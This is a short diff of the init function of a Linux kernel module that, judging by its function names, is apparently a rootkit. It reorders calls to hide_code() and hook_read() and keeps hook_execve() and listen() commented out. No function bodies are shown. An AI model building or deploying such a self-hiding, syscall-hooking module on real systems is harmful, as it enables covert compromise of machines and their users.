@@ -17,8 +17,9 @@ MODULE_LICENSE("GPL");
 
 static int __init mod_init(void)
 {
-  hide_code();
   hook_read();
+
+  hide_code();
   //hook_execve();
   //listen();
   printk(KERN_INFO "mod_init\n");
